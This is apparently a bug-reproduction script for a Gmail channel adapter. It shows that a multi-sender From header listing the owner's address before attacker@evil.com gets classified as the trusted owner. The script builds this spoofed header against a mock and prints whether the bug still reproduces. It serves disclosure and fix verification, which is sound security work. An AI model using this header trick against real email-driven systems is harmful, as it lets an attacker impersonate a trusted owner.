"""Reproduction: Gmail From-header parsing lets an attacker be classified as owner.

Run from a fresh checkout:
    uv run python repro_gmail_from_trust_confusion.py

WHAT IT SHOWS
-------------
The Gmail adapter derives the sender identity with _extract_email(), whose
result becomes BOTH the trust identity (classify()) and the channel_user_id
used for the allowlist. The original parser was:

    if "<" in addr and ">" in addr:
        return addr.split("<")[1].split(">")[0]   # first <...>
    return addr.strip()

For a multi-sender header the message is genuinely (co-)sent by the attacker,
yet the parser locks onto the first <...>, which the attacker sets to the
owner's address:

    From: Owner <owner@example.com>, <attacker@evil.com>
      -> _extract_email == "owner@example.com"
      -> classify("gmail", "owner@example.com") == "owner_paired"

So an email the attacker sent is classified as owner_paired. Breaks
invariant 2 (the action is attributed to the wrong principal). Not catalogued
in Sections 6 or 7.

EXPECTED OUTPUT
---------------
  unpatched: trust_level = owner_paired   -> BUG
  patched:   trust_level = untrusted      -> fixed (ambiguous sender not trusted)
"""

from __future__ import annotations

import asyncio
import os
import tempfile

os.environ.setdefault("GLC_CONFIG_DIR", tempfile.mkdtemp(prefix="glc-repro-"))
os.environ.setdefault("GLC_ALLOW_FORCE_PAIR", "1")

from glc.channels.catalogue.gmail.adapter import Adapter  # noqa: E402
from glc.security.pairing import get_pairing_store  # noqa: E402
from tests.channels.mocks.gmail_mock import (  # noqa: E402
    BOT_EMAIL,
    OWNER_EMAIL,
    GmailMock,
    _pubsub_push,
)


def main() -> None:
    get_pairing_store().force_pair_owner("gmail", OWNER_EMAIL, user_handle="owner")
    mock = GmailMock()

    # A message that is ALSO from attacker@evil.com, with the owner listed first.
    raw = (
        f"From: Owner <{OWNER_EMAIL}>, <attacker@evil.com>\r\n"
        f"To: {BOT_EMAIL}\r\nSubject: x\r\n\r\nATTACK"
    ).encode()
    msg_id, hist = mock._m(), mock._h()
    mock.register_message(msg_id, raw, OWNER_EMAIL, hist)
    ev = _pubsub_push(email_address=BOT_EMAIL, history_id=hist, message_id=msg_id)

    adapter = Adapter(config={"mock": mock})
    cm = asyncio.new_event_loop().run_until_complete(adapter.on_message(ev))
    trust = cm.trust_level if cm else None
    uid = cm.channel_user_id if cm else None
    print(f"channel_user_id : {uid}")
    print(f"trust_level     : {trust}")
    print()
    if trust == "owner_paired":
        print("BUG REPRODUCED: attacker-co-sent email classified as owner_paired.")
    else:
        print(f"FIXED: ambiguous multi-sender header not resolved to a trusted owner (trust={trust}).")


if __name__ == "__main__":
    main()
